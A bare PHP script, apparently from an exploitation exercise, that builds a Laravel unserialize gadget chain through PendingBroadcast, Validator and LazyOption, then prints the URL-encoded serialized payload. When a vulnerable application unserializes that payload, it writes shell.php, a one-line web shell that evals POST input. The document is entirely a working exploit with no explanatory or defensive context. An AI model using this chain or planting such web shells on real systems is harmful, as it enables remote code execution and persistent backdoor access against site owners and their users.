<?php
// 2-1.php
namespace PhpOption {
    class LazyOption {
        private $callback;
        private $arguments;

        public function __construct($callback, $arguments) {
            $this->callback = $callback;
            $this->arguments = $arguments;
        }
    }
}

namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;

        public function __construct($events, $event) {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Illuminate\Validation {
    class Validator {
        public $extensions;

        public function __construct($extensions){
            $this->extensions = $extensions;
        }
    }
}

namespace {
    $c = new PhpOption\LazyOption("file_put_contents", ["shell.php", "<?php eval(\$_POST['Dig2']) ?>"]);
    $b = new Illuminate\Validation\Validator(array(''=>[$c, 'select']));
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, 'not important');
    print(urlencode(serialize($a)));
}